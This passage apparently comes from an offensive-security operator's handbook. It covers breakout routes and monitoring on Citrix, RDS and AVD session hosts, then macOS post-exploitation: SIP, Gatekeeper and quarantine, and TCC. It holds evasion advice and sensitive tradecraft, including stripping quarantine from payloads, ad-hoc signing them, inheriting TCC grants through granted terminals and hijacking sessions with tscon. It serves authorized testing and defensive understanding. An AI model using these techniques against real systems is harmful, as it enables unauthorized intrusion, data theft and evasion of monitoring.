| Platform | Where | What it records |
| --- | --- | --- |
| Citrix | Monitoring database, surfaced in Director | Every session, its user, machine, client name, duration and the applications launched |
| Citrix | Configuration Logging database | Every administrative change, with the administrator identity. Publishing an application is logged against your admin account |
| Citrix | Session Recording server | Video and metadata of the session itself, where deployed |
| RDS | `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` | Session logon, logoff, connect, disconnect and reconnect |
| RDS | `Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational` | Connection attempts, including event ID 1149 for user authentication succeeded |
| RDS | Security log | 4624 with logon type 10 for RemoteInteractive, 4778 and 4779 for session reconnect and disconnect |
| AVD | Log Analytics `WVDConnections`, `WVDCheckpoints`, `WVDErrors`, `WVDManagement`, `WVDFeeds`, `WVDAgentHealthStatus` | Every connection, every published application opened, every management action and every error |
| Horizon | Connection Server events and event database | Sessions, entitlement changes and administrative actions |

The AVD case deserves emphasis because it is the least appreciated. `WVDCheckpoints` records the published applications a user opens, and `WVDConnections` records whether the connection was to a desktop or a published application. Your unexpected launch is visible in Azure, in a table that persists independently of the session host, whether or not anyone has EDR on the host.

#### Why session hosts are watched

Session hosts attract monitoring for structural reasons, and it is worth being clear-eyed about it rather than assuming a server is less watched than a workstation.

They are shared, so a compromise affects many users at once, which raises their criticality rating in every risk register.

They are where third parties and contractors land, which is precisely the population a security team is required to monitor and the population your engagement is often simulating.

They are the place a breakout attempt would happen, and the defenders know it, so the detections are tuned for it. "Published application spawns a shell" is not a clever bespoke rule, it is a default.

They are servers, so they get server-grade logging, often with full command-line auditing, PowerShell script block logging and Sysmon, none of which is guaranteed on a workstation.

The process ancestry detections that matter most:

```text
WINWORD.EXE / EXCEL.EXE / OUTLOOK.EXE -> cmd.exe, powershell.exe, wscript.exe, mshta.exe
msedge.exe / chrome.exe -> cmd.exe, powershell.exe
<any published application> -> explorer.exe
<any published application> -> taskmgr.exe
ftp.exe -> cmd.exe
sethc.exe / utilman.exe -> cmd.exe
notepad.exe -> anything at all
```

Every one of those is a default rule somewhere. Where you must spawn something, prefer to spawn once, get a channel, and never spawn again.

#### The human factor

This is the part that distinguishes session host work from every other target in this document, and it is a genuine operational constraint rather than a caveat.

Other people are using the machine. Right now. It is a shared server with per-user memory and CPU allocations that are, in a well-sized deployment, tight. Actions that are trivially cheap on a dedicated host are not cheap here.

Dumping process memory on a host with dozens of active sessions causes measurable disk and memory pressure. Users notice, and a performance complaint into the service desk during your test window gets your activity found by the operations team rather than the security team, which is a worse outcome in every respect.

Crashing the host disconnects everyone on it. A crashed session host is a visible outage with immediate business impact, an incident ticket, and a root cause investigation that will find you. Techniques with a crash risk, particularly anything involving driver interaction, memory manipulation of system processes or exploitation of a service running as SYSTEM, should be treated as high-impact on a session host in a way they would not be on a lab VM.

Session hijacking with `tscon` takes a working desktop away from a person who is using it. They will notice within seconds and report within minutes. Treat it as a technique of last resort with a near-certain detection cost, and prefer token or credential theft that leaves the human undisturbed.

Modifying anything machine-wide affects every user. Replacing a binary in `System32`, changing a machine-wide policy, or altering a published application's configuration changes the experience of everyone on the host, which multiplies both the impact and the chance of a report.

Non-persistent hosts are your friend on artefacts and your enemy on evidence handling. Everything you did is destroyed at logoff, which shortens the forensic window considerably. Responders in these environments know this and their playbooks say to snapshot or isolate the machine immediately rather than investigating live, so expect the host to be frozen rather than reset the moment anyone is suspicious.

### Summary: restriction mechanism, breakout route, requirement

| Restriction | Enforced by | Breakout route | Needs |
| --- | --- | --- | --- |
| Published application, no shell | RDS `TSAppAllowList`, or the Citrix broker | Any launcher inside the application: file dialog, help, embedded browser, macro engine | A single reachable launcher |
| `TSAppAllowList` with `fDisabledAllowList` set | Nothing, the list is off | Edit the `.rdp` `alternate shell` or `remoteapplicationprogram` to name any program | Ability to craft the `.rdp` file |
| `CommandLineSetting = 1` on a published app | Session host | Supply your own `remoteapplicationcmdline` arguments | A published program whose arguments give you execution |
| `NoRun`, `RestrictRun`, `DisallowRun` | `explorer.exe` only | Any process creation not routed through the shell: Task Manager run dialog, script engine, scheduled task, WMI, child of the published app | Any non-shell launcher |
| `NoViewContextMenu` | `explorer.exe` | Typed paths and shell monikers in the dialog address bar instead of the context menu | A dialog with an address bar |
| `DisableCMD = 2` | `cmd.exe` | Batch files, which still run | A file write and a launcher |
| `DisableCMD = 1` | `cmd.exe` | A different interpreter entirely: PowerShell, WSH, a macro engine | Something other than `cmd.exe` |
| `DisableTaskMgr` | `taskmgr.exe` | Any other launcher | Alternative launcher |
| Kiosk shell replacement via Winlogon `Shell` | `userinit.exe` reading the value | Write your own `HKCU` `Shell` value, log off and on. Or run `explorer.exe` directly | `HKCU` write and a logoff cycle, or one process creation |
| Assigned Access or Shell Launcher kiosk | Assigned Access CSP configuration | Same as above; the restrictions are user-experience level | One process creation |
| Accessibility features present | Nothing | Trigger `sethc`, `utilman`, `osk`, Narrator and use their menus, settings and help | Only that the features are enabled |
| Accessibility binary or IFEO substitution | Filesystem and `HKLM` ACLs | Replace the binary or set the IFEO `Debugger` | Local administrator. Persistence-grade, not initial breakout |
| AppLocker | Kernel, `AppIDSvc` | See the Windows Post-Exploitation section | Material from that section, not this one |
| WDAC | Kernel code integrity | See the Windows Post-Exploitation section | Material from that section |
| PowerShell Constrained Language Mode | PowerShell engine | See the Windows Post-Exploitation section, or use a non-PowerShell engine | Material from that section |
| Drive redirection disabled | Platform policy on the server | Clipboard, internal file share staging, WebDAV, the application's own network access | Any surviving channel |
| Clipboard redirection disabled | Platform policy | Drive redirection, internal staging, outbound HTTP from the session | Any surviving channel |
| No session host egress | Network policy | Platform-required allow-listed endpoints, DNS, internal staging, or the display protocol's own virtual channels back to your endpoint | An allow-listed destination or a redirected channel |
| Non-persistent host defeats persistence | Provisioning design | Persist in the identity, the image, or the profile | Depends on which; the identity route needs least |
| Shared host you must not disturb | Physics and other people | Targeted credential and token extraction rather than bulk dumping, out of hours where possible | Judgement |



# macOS Post-Exploitation

## What Is Actually Different About macOS

macOS is a certified UNIX with a BSD userland, and that fact is a trap. Almost every reflex a Linux operator has transfers syntactically and fails semantically. `id` works, `ps` works, `find / -perm -4000` works, and then you get root and discover that root cannot read the user's Documents folder, cannot attach a debugger to a system binary, cannot write to `/usr/bin`, cannot inject a dylib into Safari, and cannot read the database that decides what root is allowed to read. The Linux privilege model is a single axis: you are uid 0 or you are not. macOS layers four independent, orthogonal enforcement systems on top of POSIX, each of which can deny an action that POSIX permits, and none of which uid 0 overrides.

The four are **System Integrity Protection** (what can be modified), **Transparency, Consent and Control** (what can be read, recorded, or automated), **code signing plus the hardened runtime and library validation** (what code can run inside what process), and the **App Sandbox** (what a consenting application confines itself to). SIP and TCC are kernel-enforced and mandatory. Signing enforcement is kernel-enforced and, on Apple silicon, unconditional. The sandbox is opt-in by the developer but is not optional once opted into.

Get this wrong and you will waste a whole engagement. The single most common failure is an operator with a root shell on a developer's Mac who cannot exfiltrate the developer's source tree, browser cookies, or Messages history, concludes the box is worthless, and moves on. It is not worthless. It requires a different move: TCC is a per-process-identity grant system, so the correct play is not to escalate privilege but to acquire, borrow, or impersonate a code identity that already holds the grant you need.

### System Integrity Protection

SIP is a mandatory access control layer that has been on by default since OS X 10.11. It applies to every process, including uid 0, including code running in the kernel's own address space in the sense that unsigned kernel code cannot get there in the first place. It restricts, at minimum:

| Restriction | Effect |
| --- | --- |
| Filesystem | `/System`, `/usr` (except `/usr/local`), `/bin`, `/sbin`, and Apple-shipped applications are read-only to everything. Individual files and directories elsewhere are marked with a restricted flag and get the same treatment |
| Process debugging | `task_for_pid` against an Apple platform binary fails. No `lldb`, no `dtrace`, no memory read, no code injection into system processes |
| Kernel extensions | Unsigned or unapproved kexts will not load |
| NVRAM | Boot-security-relevant NVRAM variables cannot be written from a running OS |
| DTrace | Restricted against protected processes |
| Runtime protections | Certain entitlements (`com.apple.rootless.*`, the private TCC management entitlements) cannot be forged, because forging them requires modifying a signature that the kernel checks |

Check it, and check whether the system volume seal is intact, before you plan anything:

```bash
csrutil status
# System Integrity Protection status: enabled.

csrutil authenticated-root status
# Authenticated Root status: enabled
```

Two important currency notes. First, on current macOS the `csrutil` verb list is short: `clear`, `disable`, `enable`, `status`, `authenticated-root`, and `allow-research-guests`. The granular `csrutil enable --without kext` / `--without fs` / `--without debug` syntax that fills older write-ups is not in the shipped usage text on macOS 26, and on Apple silicon SIP state is a property of the machine's LocalPolicy managed through Startup Security Utility and `bputil`, not a simple NVRAM word. Second, `disable` and `enable` are only available from recoveryOS. That means **you cannot disable SIP from a compromised running system**. It requires a reboot into recovery, which on Apple silicon requires holding the power button, which requires physical presence, and on a FileVault machine requires a credential that can unlock the volume. For a remote operator SIP is a fixed constraint, not an obstacle to be removed.

The individual `CSR_ALLOW_*` bits exist in the kernel and are what `csrutil status` decodes, but the exact bit values differ between references and I will not assert hex constants I have not read out of a current kernel source drop. <!-- VERIFY -->

**The signed system volume** is a separate and stronger mechanism. Since macOS 11 the system volume is sealed with a Merkle tree whose root hash ("the seal") covers every byte, verified by the boot loader on Apple silicon and by the kernel on Intel plus T2 before root is mounted. This is not a permission check that root fails, it is a cryptographic invariant: there is no privilege level within the running OS that can modify the system volume, because the running OS is booted from a verified read-only snapshot. Persistence in `/System` is not a thing you do on modern macOS. Apple delivers updates to discrete system components through **cryptexes**, separately sealed and mounted images layered over the sealed volume, which is why `/usr/lib/dyld` and the dyld shared cache can change without a full reseal.

### Code signing, notarisation and Gatekeeper

Three separate things that get conflated constantly.

**Code signing** is a signature over the Mach-O and, for a bundle, over its resources. It establishes a stable code identity: a team identifier, a bundle or binary identifier, and a designated requirement. It says nothing about trustworthiness. An ad-hoc signature (`codesign -s -`) has no team and no certificate chain, and is the weakest valid form.

**Notarisation** is Apple having scanned the binary, found no known malware, and issued a ticket. The ticket can be stapled to the artefact or fetched online at assessment time. Notarisation is not a trust judgement about the developer, it is a malware scan result plus a revocation handle. Notarisation is what Gatekeeper wants; a Developer ID signature alone is no longer sufficient for a first launch of a quarantined app.

**Gatekeeper** is the policy engine that evaluates an artefact at first launch. The critical and constantly misunderstood point is **what triggers it**: Gatekeeper assessment is driven by the presence of the `com.apple.quarantine` extended attribute, not by the file having come from the internet in some abstract sense. No quarantine attribute means no Gatekeeper evaluation. That single sentence is most of macOS initial access and delivery tradecraft.

```bash
# Signature detail, including the CodeDirectory flags that tell you whether the
# hardened runtime and library validation are in force.
codesign -dv --verbose=4 /Applications/SomeApp.app
# CodeDirectory v=20500 size=765 flags=0x12a00(kill,restrict,library-validation,runtime)
# TeamIdentifier=EQHXZ8M8AV

# Entitlements. This is the single most useful command on a macOS host.
codesign -d --entitlements - /Applications/SomeApp.app

# What Gatekeeper would say. -t exec for executables, -t install for packages.
spctl -a -vvv -t exec /Applications/SomeApp.app
# accepted
# source=Notarized Developer ID
# origin=Developer ID Application: Google LLC (EQHXZ8M8AV)

# Notarisation ticket, stapled or otherwise.
xcrun stapler validate /Applications/SomeApp.app
```

The `flags=` field in `codesign -dv` output is the fastest triage in macOS post-exploitation. Read it as a bitfield of names: `runtime` means the hardened runtime is on, `library-validation` means only code signed by the same team (or Apple) can be loaded into the process, `restrict` means `DYLD_*` environment variables are ignored, and `kill` means the process is killed on an invalid page rather than continuing. An application with none of those is an injection target. An application with all of them is not, without a signature-level attack.

On current macOS the global escape hatch is gone. `spctl --global-disable` (formerly `--master-disable`) no longer disables Gatekeeper:

```bash
spctl --status
# assessments enabled

spctl --disable-status
# The option to globally disable the assessment system is currently not available in System Settings.
```

That message is the current behaviour and reflects the change introduced in macOS 15 Sequoia. The `spctl` manual page now states outright that as of macOS 15.0, operations which modify the rule database or the global state of the assessment subsystem are no longer supported, and lists `--add`, `--remove`, `--enable`, `--disable` and `--reset-default` as deprecated. `--global-disable` no longer disables anything; it merely reveals the "Anywhere" option in the Privacy and Security settings pane, and `--disable-status` queries whether that option is even available. `--status` and `--assess` still work normally.

Apple's current documented procedure for opening a blocked application is: attempt to open it, then go to System Settings, Privacy and Security, scroll down, click "Open Anyway", and confirm in the dialogue that reappears. The Control-click shortcut is no longer the documented mechanism. Anything in an older playbook that begins `sudo spctl --master-disable` is dead, and anything that relies on talking a user through a right-click is now a multi-step, high-friction, high-visibility social engineering ask.

### The quarantine attribute

`com.apple.quarantine` is an extended attribute whose value is four semicolon-separated fields: a hex flag word, a hex timestamp, the name of the agent that applied it, and a UUID keying an entry in the per-user LaunchServices quarantine event database.

```bash
xattr -l ~/Downloads/thing.pdf
# com.apple.quarantine: 0083;6a6b66e8;MSTeams;325A4111-4414-4DEC-857C-62C836C79DE7

xattr -p com.apple.quarantine ~/Downloads/thing.pdf   # read one attribute
xattr -d com.apple.quarantine ./payload               # remove it
xattr -c ./payload                                    # remove every xattr
xattr -r -d com.apple.quarantine ./Payload.app        # recursive, needed for bundles
```

Observed flag words on a real corporate machine include `0081`, `0082`, `0083`, `0087`, `00c1`, `0181` and `01c1`, varying with the applying agent and with whether the user has since approved the item. The low bits encode provenance and approval state, and the practical operator rule is simply that a nonzero value means Gatekeeper will engage. I will not assert individual bit meanings I cannot cite. <!-- VERIFY: quarantine flag bit semantics -->

**Propagation is the part that matters.** Quarantine is applied by the downloading process, voluntarily, via the LaunchServices quarantine API, and a bundle opts in with the `LSFileQuarantineEnabled` key in its `Info.plist`. Browsers, mail clients, chat clients, AirDrop and Archive Utility all do it. Command line tools do not. Verified on current macOS:

```bash
curl -s -o /tmp/test.bin https://example.com/thing
xattr -l /tmp/test.bin
# (no output: no quarantine attribute)
```

That is the whole game for delivery. A file that arrives by `curl`, `wget`, `scp`, `git clone`, an SMB or NFS mount, a `pip`/`npm`/`brew` install, or as the output of a compiler on the box, has no quarantine attribute and is never assessed by Gatekeeper. `curl` in particular never calls the quarantine API: even `curl --xattr` writes only `xdg.origin.url` and `xdg.referrer.url`, never `com.apple.quarantine`. A file that arrives through a browser, a mail client, a chat client, or AirDrop does get the attribute.

**Correction to widely repeated guidance: command line archive tools now propagate quarantine.** Tested on current macOS, extracting a quarantined `.zip` with `/usr/bin/unzip`, or a quarantined tarball with `/usr/bin/tar`, or with `ditto -x -k`, results in extracted files carrying the *identical* `com.apple.quarantine` value. "Download the archive in the browser and extract it from the terminal" was a genuine bypass on much older macOS and is dead. Apple's own description is that Gatekeeper "tracks the provenance of files written by downloaded software", and that now includes the shell tools. Assume propagation, and get the archive onto the box by a route that never quarantines it in the first place.

Quarantine on a `.dmg` behaves differently: the attribute is not copied onto individual files inside the mounted volume, but applications launched from the mounted image are still assessed through the volume's association with the quarantine event.

**Two further attributes are SIP-protected and cannot be stripped**, which is the opsec sting in the tail. `com.apple.macl` is the TCC access record and cannot be removed with `xattr -d`. `com.apple.provenance`, introduced in macOS 13, is an identifier stamped on every file created or modified by a non-App-Store application after that application clears its Gatekeeper check, tracked in the ExecPolicy database and consumed by XProtect Remediator. Deleting `com.apple.quarantine` does not erase the record of which tool wrote the file, and you cannot delete the record that does. The only way to shed those attributes is to copy the file to a filesystem that does not carry extended attributes and back. <!-- VERIFY: exact provenance attribute semantics and ExecPolicy database path -->

Two related artefacts travel with downloaded files and are worth knowing about from both sides. `com.apple.metadata:kMDItemWhereFroms` records the source URL and the referrer, readable with `mdls`, and is often more incriminating than the quarantine attribute itself. `com.apple.macl` is a TCC-related attribute recording that a specific application was granted access to that specific file by the user opening it, which is how "the user dragged this file into the app" becomes a durable permission without a prompt.

```bash
mdls -name kMDItemWhereFroms -name kMDItemDownloadedDate ~/Downloads/thing.pdf
```

### Transparency, Consent and Control

TCC is the single most important thing to understand and has no Linux equivalent. It is a per-code-identity, per-resource consent database enforced in the kernel and adjudicated by the `tccd` daemon. POSIX permissions decide whether the file's owner can read it. TCC decides whether *this particular binary* can read it, and TCC is checked second and independently. A root shell has uid 0 and, absent a grant, has no TCC permissions at all.

The resources TCC gates are not a short list. Extracted from the shipping `tccd` on macOS 26, the service identifiers relevant to an operator on a Mac are:

| Service identifier | What it gates | Why you care |
| --- | --- | --- |
| `kTCCServiceSystemPolicyAllFiles` | Full Disk Access. Everything TCC-protected, plus the TCC databases themselves | The master key. Almost every technique below either needs this or is a way of getting it |
| `kTCCServiceSystemPolicyDesktopFolder` | `~/Desktop` | Where executives keep everything |
| `kTCCServiceSystemPolicyDocumentsFolder` | `~/Documents` | |
| `kTCCServiceSystemPolicyDownloadsFolder` | `~/Downloads` | |
| `kTCCServiceSystemPolicyNetworkVolumes` | Mounted network shares | |
| `kTCCServiceSystemPolicyRemovableVolumes` | USB and external media | |
| `kTCCServiceSystemPolicyAppData` | Other applications' `~/Library/Containers` and application support data | Browser and messaging data lives here |
| `kTCCServiceSystemPolicyAppBundles` | Modifying other applications' bundles | Gates the bundle-tampering privesc route |
| `kTCCServiceSystemPolicyDeveloperFiles` | Developer-designated files and directories | Directly relevant on engineering machines |
| `kTCCServiceSystemPolicySysAdminFiles` | Administrative configuration files | |
| `kTCCServiceScreenCapture` | Screen recording and screenshots | Live screen capture, and reading other windows' contents |
| `kTCCServiceAccessibility` | The Accessibility API: driving other applications' UI | The strongest single grant after Full Disk Access. Read any window, click any button, type into any field |
| `kTCCServicePostEvent` | Synthesising `CGEvent` keystrokes and clicks | Keystroke injection |
| `kTCCServiceListenEvent` | Input Monitoring: global keyboard and HID event capture | Keylogging |
| `kTCCServiceAppleEvents` | Automation: sending Apple Events to another named application | Scoped per source-application and target-application pair |
| `kTCCServiceMicrophone`, `kTCCServiceCamera`, `kTCCServiceAudioCapture` | Audio and video capture | Highest-consequence, hardest to obtain silently |
| `kTCCServiceAddressBook`, `kTCCServiceCalendar`, `kTCCServiceReminders`, `kTCCServicePhotos`, `kTCCServiceMediaLibrary` | The obvious personal data stores | Contacts is an excellent internal target list |
| `kTCCServiceEndpointSecurityClient` | Running an Endpoint Security client | Required by every macOS EDR agent. Also required to *become* one |
| `kTCCServiceDeveloperTool` | Running locally built or unsigned code without further per-binary assessment | The grant `spctl developer-mode enable-terminal` sets |
| `kTCCServiceRemoteDesktop` | Remote management and screen sharing access | |
| `kTCCServicePasteboard` | Cross-application pasteboard reads | Passwords transit the clipboard constantly |

The databases live at fixed paths and are protected:

```bash
# User grants
~/Library/Application\ Support/com.apple.TCC/TCC.db
# System-wide and MDM-delivered grants
/Library/Application\ Support/com.apple.TCC/TCC.db
```

```bash
ls -l ~/Library/Application\ Support/com.apple.TCC/
# ls: .../com.apple.TCC/: Operation not permitted
```

That error, from an interactive shell belonging to the owning user, is the whole point. The user's own home directory contains a database the user cannot list. The protection is not POSIX and it is not just SIP's restricted flag; reading it requires the reading process to hold `kTCCServiceSystemPolicyAllFiles`, and writing it requires that too. Malware observed in the wild during 2026 logs a "kernel protection" failure when it attempts to replace `TCC.db` directly, so the direct-write path is still closed by default on current macOS.

The `access` table schema is broadly stable but has changed across releases. The columns that matter are `service` (the identifier from the table above), `client` (a bundle identifier or an absolute path), `client_type` (0 for bundle identifier, 1 for path), `auth_value` (0 denied, 2 allowed, with intermediate values for unknown and limited grants), `auth_reason` (how the grant came to exist: user prompt, MDM, system policy), and `csreq`, a compiled code requirement blob that `tccd` evaluates against the requesting binary's actual signature on every access. Run `sqlite3 TCC.db ".schema access"` on the target build rather than trusting any published schema. <!-- VERIFY: current column set on macOS 26 -->

The `csreq` column is why a stolen grant is not portable. Even with write access you cannot simply insert a row naming your binary and expect it to work, because `tccd` recomputes the code identity at access time and compares it against the recorded requirement. This is also why `tccutil` is far less useful than its name suggests. Its entire supported surface is:

```bash
tccutil reset SERVICE [BUNDLE_ID]
# tccutil: Usage: tccutil reset SERVICE [BUNDLE_ID]
```

There is no `grant`, no `list`, no `dump`. Resetting re-arms the prompt, which is loud.

**Attribution and the responsible process.** TCC does not attribute a request to the process that made it in the naive sense. It walks a responsibility chain, so a script, a compiled tool, or `osascript` launched from a terminal emulator is attributed to that terminal emulator. This is the most operationally significant TCC behaviour on the platform, in both directions. If the user has granted Full Disk Access to Terminal, iTerm2, VS Code, or a JetBrains IDE (and on a developer's machine, one of these is nearly always granted), then anything you run inside that process tree inherits the grant with no prompt. Conversely, if you get a shell through a process with no grants, you have nothing, and reaching out to a granted process is the escalation.

You can see this reasoning happen. The `com.apple.TCC` subsystem in the unified log is readable by an unprivileged user and narrates every decision:

```bash
/usr/bin/log show --last 30m --predicate 'subsystem == "com.apple.TCC"' --style compact
```

```text
tccd[603] [com.apple.TCC:access] AUTHREQ_CTX: msgID=597.7080, function=TCCAccessRequest,
  service=kTCCServiceSystemPolicyAllFiles, preflight=yes, query=1
tccd[603] [com.apple.TCC:access] AUTHREQ_ATTRIBUTION: msgID=597.7080,
  attribution={accessing={TCCDProcess: identifier=com.microsoft.wdav, pid=803,
  binary_path=/Applications/Microsoft Defender.app/Contents/MacOS/wdavdaemon},
  requesting={TCCDProcess: identifier=com.apple.sandboxd, pid=597,
  binary_path=/usr/libexec/sandboxd}, }
tccd[603] [com.apple.TCC:access] AUTHREQ_RESULT: msgID=597.7080, authValue=2,
  authReason=6, authVersion=1, desired_auth=0, error=(null)
```

Note the `accessing` and `requesting` split: that is the responsibility chain, explicitly logged. `authValue=2` is a grant. This gives you a complete read of the TCC state of the machine, including which applications hold which permissions and which have been denied, from an unprivileged shell, with no access to the protected database at all. It is the single best macOS enumeration technique in this document and it is covered again under enumeration below.

**What MDM can grant.** Configuration profiles carry a Privacy Preferences Policy Control (PPPC) payload, `com.apple.TCC.configuration-profile-policy`, which pre-approves TCC grants for named bundle identifiers and code requirements. On a supervised, Automated Device Enrolment machine this is silent: no prompt, no user involvement. The payload covers Accessibility, Apple Events, Full Disk Access (`SystemPolicyAllFiles`), Screen Recording, Post Event, Input Monitoring, the folder services, Bluetooth, Calendar, Contacts, Photos, Reminders, Media Library, Speech Recognition, and network and removable volume access. Camera and Microphone are documented as requiring user interaction and are not silently grantable by profile, and Location Services is not a PPPC-managed service at all. <!-- VERIFY: exact current PPPC service list and the camera/microphone exception on macOS 26 -->

The consequence is the most important sentence in the Enterprise Integration and Lateral Movement section below, stated early: **whoever controls MDM can silently grant Full Disk Access, Screen Recording, and Accessibility to any code identity they choose, on every enrolled Mac.** That is a complete bypass of the entire TCC model, delivered as a supported administrative feature.

### The hardened runtime, library validation and the sandbox

The **hardened runtime** is an opt-in set of process-level restrictions a developer enables at signing time, and it is mandatory for notarisation, which makes it effectively universal on current third-party software. It disables `DYLD_*` environment variable injection, enforces library validation, blocks `task_for_pid` against the process, and prevents unsigned executable memory unless specific entitlements are present. Each restriction has a corresponding entitlement that relaxes it, and finding an application that ships one of those entitlements is a genuine finding:

| Entitlement | What it re-enables |
| --- | --- |
| `com.apple.security.cs.disable-library-validation` | Loading dylibs signed by a different team, or ad-hoc signed | 
| `com.apple.security.cs.allow-dyld-environment-variables` | `DYLD_INSERT_LIBRARIES` and friends |
| `com.apple.security.cs.allow-unsigned-executable-memory` | Writable-executable pages, JIT-adjacent |
| `com.apple.security.cs.disable-executable-page-protection` | The broadest relaxation of the lot |
| `com.apple.security.cs.allow-jit` | `MAP_JIT` pages |
| `com.apple.security.get-task-allow` | Anyone can obtain the task port and inject or debug |

An application holding both a valuable TCC grant and `disable-library-validation` or `get-task-allow` is a TCC escalation waiting to happen. Electron applications, browsers, and anything embedding a scripting runtime are the usual suspects, though browsers typically compensate with sandboxed child processes.

**Library validation** deserves separating from the hardened runtime because it is what actually stops dylib injection. When it is in force, the kernel will only map a dylib into the process if that dylib is signed by the same team identifier as the main executable, or by Apple. Not "signed by anyone", not "notarised": the same team. This is why the dylib hijacking that dominated macOS tradecraft in the 2015 to 2019 era mostly does not work against current software, and why the modern version of the technique is a hunt for the minority of applications that lack it.

The **App Sandbox** is a separate, developer-opted, profile-driven confinement (`com.apple.security.app-sandbox`) that restricts filesystem, network and IPC access to what the application declared it needs. Mac App Store distribution requires it; Developer ID distribution does not. It is not a privilege boundary you will typically be attacking, but it is the reason a compromised Mac App Store application is much less useful than a compromised Developer ID one.

### Apple silicon versus Intel

This distinction changes the security model, not just the instruction set.

| | Intel | Apple silicon |
| --- | --- | --- |
| Unsigned Mach-O execution | Runs | Refused by the kernel. Every executable must carry at least an ad-hoc signature |
| SIP configuration | NVRAM-based, granular disabling historically possible | Part of the machine's LocalPolicy, managed through recoveryOS and `bputil`, per-installation, and gated behind Reduced Security |
| Kernel extensions | Loadable with user or MDM approval | Require Reduced Security mode, a reboot into recovery, and physical presence. Effectively dead |
| x86_64 payloads | Native | Require Rosetta 2 to be installed |
| Secure Enclave key storage | T2 Macs only | Universal, and increasingly the default for identity keys |
| Managed Device Attestation | Not available | macOS 14 and later, hardware-bound ACME keys |

Practically: on Apple silicon your payload must be signed, even if only ad-hoc, or it will not execute. `codesign -f -s - ./payload` costs nothing and is not optional. Check what you are on:

```bash
uname -m                          # arm64 or x86_64
sysctl -n hw.optional.arm64       # 1 on Apple silicon
sysctl -n sysctl.proc_translated  # 1 if the current process is running under Rosetta
sysctl -n machdep.cpu.brand_string
/usr/bin/arch -arch arm64e /usr/bin/true 2>/dev/null && echo "arm64e usable"
ls /Library/Apple/usr/libexec/oah 2>/dev/null && echo "Rosetta 2 present"
```

The last check matters because Rosetta 2 is not installed by default on a fresh Apple silicon machine; it is installed on demand the first time an x86_64 binary is launched, and that installation is itself a visible, logged event. An x86_64-only payload on a machine without Rosetta either fails or triggers an install prompt. Build universal, or build `arm64`. <!-- VERIFY: exact Rosetta support directory path on macOS 26 -->

### Why root is not enough, stated plainly

Coming from Linux this is the counter-intuitive part, so here it is as a table. Every row is an action that root fails.

| Action as root | Blocked by | What you actually need |
| --- | --- | --- |
| Read `~/Library/Safari`, `~/Library/Messages`, `~/Library/Application Support/com.apple.sharedfilelist` | TCC | Full Disk Access for the calling process, or a granted code identity |
| Read or write either `TCC.db` | TCC plus SIP | Full Disk Access |
| Write to `/System`, `/usr/bin`, `/bin` | SIP and the sealed system volume | recoveryOS, and it does not survive as persistence |
| Attach a debugger to `tccd`, `securityd`, `launchd` | SIP | SIP disabled, which needs physical presence |
| Inject a dylib into a notarised third-party application | Library validation | An application without it, or a same-team signing certificate |
| Load a kernel extension | SIP plus platform policy | Reduced Security, recoveryOS, physical presence |
| Capture the screen or synthesise keystrokes | TCC | `kTCCServiceScreenCapture` or `kTCCServicePostEvent` |
| Read the user's login keychain contents | Keychain ACLs plus the unlock model | The user's password, or an unlocked keychain plus per-item authorisation |
| Turn on FileVault for a user, or add a user who can unlock the disk | Secure token / bootstrap token | A secure-token-holding credential, or the MDM-escrowed bootstrap token |

Conversely, some things root does still buy outright: reading every non-TCC-protected file on disk, `/Library/Keychains/System.keychain` together with its unlock key at `/var/db/SystemKey`, writing to `/Library/LaunchDaemons`, installing packages, and modifying non-SIP-protected third-party software in `/Applications` and `/Library`. Root on macOS is best thought of as "full filesystem access to everything except the user's private data and the system volume".

## Situational Awareness on a macOS Host

Run this first, before anything else, because on macOS the answers determine which of the later sections apply at all. An unmanaged Intel Mac with SIP disabled and a locally created admin account is a different target from a supervised Apple silicon machine enrolled in Intune with Platform SSO and Defender's Endpoint Security extension loaded.

### Identity, groups, and the admin-versus-root distinction

The single most important local distinction on macOS is between membership of the `admin` group (gid 80) and being uid 0. They are not the same and conflating them is the classic Linux-brain error.

```bash
id
whoami
groups
dscl . -read /Groups/admin GroupMembership
dsmemberutil checkmembership -U "$(whoami)" -G admin
```

```text
uid=501(steven.harris) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),
  79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),204(_developer),
  399(com.apple.access_ssh),400(com.apple.access_remote_ae)
```

Read that carefully. `80(admin)` means the account can escalate to root, because the default `/etc/sudoers` grants `%admin` full sudo. It also means the account can authenticate to a large number of authorisation rights whose `group` key is `admin`. But it does not mean the account is currently root, and a great deal of macOS behaviour keys off the `admin` group rather than uid 0.

The other group memberships in that list are individually useful. `_developer` (gid 204) is required to use developer tools without a prompt. `com.apple.access_ssh` (gid 399) controls who may log in over SSH when Remote Login is restricted to specific users, and `com.apple.access_screensharing` (398) does the same for screen sharing. `com.apple.access_remote_ae` (400) governs remote Apple Events. `_lpadmin` (98) can add printers, which historically has been a CUPS-adjacent local privesc surface. Enumerate the access groups explicitly, because they tell you who can reach the box remotely:

```bash
for g in com.apple.access_ssh com.apple.access_screensharing com.apple.access_remote_ae \
         com.apple.access_ftp _developer admin wheel _appserveradm; do
  printf '%s: ' "$g"; dscl . -read /Groups/$g GroupMembership 2>/dev/null | cut -d' ' -f2-
done
```

Also check the `AuthenticationAuthority` attribute for the account, which reveals more than it looks like it does:

```bash
dscl . -read /Users/$(whoami) AuthenticationAuthority
```

```text
AuthenticationAuthority: ;ShadowHash;HASHLIST:<SALTED-SHA512-PBKDF2,SRP-RFC5054-4096-SHA512-PBKDF2>
  ;SecureToken; ;Kerberosv5;;steven.harris@LKDC:SHA1.8EFC...;LKDC:SHA1.8EFC...;
```

`ShadowHash` with `SALTED-SHA512-PBKDF2` means a local password hash exists and where. `SRP-RFC5054-4096-SHA512-PBKDF2` is the verifier used for Secure Token and remote authentication flows. **`;SecureToken;` is the one that matters most**: a secure token is the cryptographic credential that lets an account unlock a FileVault volume and authorise new secure tokens. Without one, an account you create cannot log in at the FileVault pre-boot screen and cannot be granted FileVault access, which is a hard constraint on persistence via new accounts. `Kerberosv5` with an `LKDC:` principal is the local KDC, present on every Mac, and is not evidence of Active Directory.

```bash
sysadminctl -secureTokenStatus $USER      # requires root or an admin credential
fdesetup list                              # which users can unlock FileVault; needs root
```

### OS version, hardware and architecture

```bash
sw_vers
# ProductName:    macOS
# ProductVersion: 26.6.2
# BuildVersion:   25G83

uname -a
sysctl -n hw.model machdep.cpu.brand_string hw.memsize
sysctl -n hw.optional.arm64 sysctl.proc_translated
